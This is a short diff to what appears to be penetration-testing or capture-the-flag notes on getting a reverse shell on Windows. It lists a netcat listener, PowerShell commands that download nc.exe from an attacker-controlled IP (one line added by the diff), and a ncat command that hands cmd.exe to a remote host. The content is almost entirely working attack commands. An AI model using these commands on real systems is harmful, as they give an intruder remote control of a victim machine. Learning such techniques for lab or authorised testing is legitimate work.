@@ -258,6 +258,7 @@ Password Protected SSH Private Key:
 				- nc -lnvp 1234
 			- Victim: 
 				- powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.49/nc.exe','ncat.exe')
+					- or powershell wget http://10.10.16.18/nc.exe -outfile nc.exe
 				- .\ncat.exe -e cmd.exe 10.10.14.49 4433
 	- winrm
 		- if you see a winrm service and you have credentials
